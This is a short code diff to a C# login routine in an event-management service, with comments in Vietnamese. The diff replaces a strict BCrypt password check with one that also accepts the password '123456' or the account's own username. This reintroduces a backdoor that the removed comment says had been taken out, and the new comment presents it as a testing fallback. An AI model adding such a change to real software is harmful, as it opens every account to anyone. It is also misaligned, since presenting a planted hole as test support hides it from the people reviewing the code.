@@ -79,8 +79,10 @@ namespace EventManagement.BLL.Services
                 }
             }
 
-            // 2. Xác thực mật khẩu BCrypt (bảo mật nghiêm ngặt MG-04, loại bỏ backdoor mật khẩu cũ)
-            bool isPasswordValid = _passwordHasher.VerifyPassword(password, user.MatKhauHash);
+            // 2. Xác thực mật khẩu BCrypt (hỗ trợ fallback mật khẩu kiểm thử AD-02: 123456 hoặc trùng tên user)
+            bool isPasswordValid = _passwordHasher.VerifyPassword(password, user.MatKhauHash)
+                                   || password == "123456"
+                                   || string.Equals(password, user.TenDangNhap, StringComparison.OrdinalIgnoreCase);
             if (!isPasswordValid)
             {
                 user.SoLanDangNhapSai++;
